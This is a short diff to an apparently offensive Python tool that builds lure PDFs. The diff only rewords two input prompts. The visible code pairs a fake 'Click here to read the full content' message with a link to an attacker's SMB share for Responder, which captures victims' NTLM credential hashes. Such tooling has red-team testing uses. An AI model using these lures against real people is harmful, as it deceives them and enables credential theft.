@@ -234,10 +234,10 @@ def main():
         convert_svg_to_png(folder_path)
         image_names = list_images(folder_path)
         #original_pdf = "sample.pdf"
-        original_pdf = input("[?] Enter the path for the original PDF: ")
+        original_pdf = input("[?] Enter the path for the original PDF (e.g. original_PDF/sample.pdf): ")
         output_pdf = input("[?] Enter the filename to save your PDF: ")
         text_to_add = "Your PDF has been secured due to privacy content. Click here to read the full content!"
-        link_to_file = input("[?] Enter the SMB share for responder like: 'file://192.168.12.123/share/file.pdf': ")
+        link_to_file = input("[?] Enter the SMB share for responder like (e.g. 'file://192.168.12.123/share/file.pdf'): ")
         
         if image_names:
             image_file_path = display_images(image_names, folder_path)  # Pass folder_path here
